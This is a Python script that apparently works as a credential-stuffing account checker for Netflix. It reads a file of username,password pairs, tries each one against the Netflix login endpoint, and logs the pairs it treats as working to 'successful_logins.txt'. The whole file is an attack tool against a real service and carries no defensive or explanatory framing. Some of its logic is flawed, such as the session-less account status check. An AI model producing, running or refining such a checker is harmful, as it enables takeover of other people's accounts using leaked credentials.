import requests

def login(username, password):
    url = "https://www.netflix.com/ng/login"
    payload = {
        "userLoginId": username,
        "password": password
    }
    response = requests.post(url, data=payload)
    return response

def save_result(username, password, result):
    if "Welcome" in result.text or "Account Dashboard" in result.text:
        with open("successful_logins.txt", "a") as file:
            file.write(f"Username: {username}, Password: {password}\n")
        return "Success"
    elif "Invalid credentials" in result.text or "Incorrect password" in result.text or "Please try again" in result.text:
        with open("unsuccessful_logins.txt", "a") as file:
            file.write(f"Username: {username}, Password: {password}\n")
        return "Failure"
    else:
        with open("unknown_logins.txt", "a") as file:
            file.write(f"Username: {username}, Password: {password}\n")
        return "Unknown"

def check_account_status():
    response = requests.get("https://www.netflix.com/account")
    return response.status_code == 200

def main():
    file_path = input("Please provide the path to the .txt file containing the username and password combinations: ")
   
    with open(file_path, "r") as file:
        lines = file.readlines()
        total_attempts = len(lines)
        for index, line in enumerate(lines, start=1):
            username, password = line.strip().split(",")
            result = login(username, password)
            status = save_result(username, password, result)
            
            # Print progress report and account status
            print(f"Attempt {index}/{total_attempts}: Username: {username}, Password: {password} - Status: {status}")
            
            # Check account status and print login result
            if check_account_status():
                print("Login successful!")
            else:
                print("Login failed.")

if __name__ == "__main__":
    main()
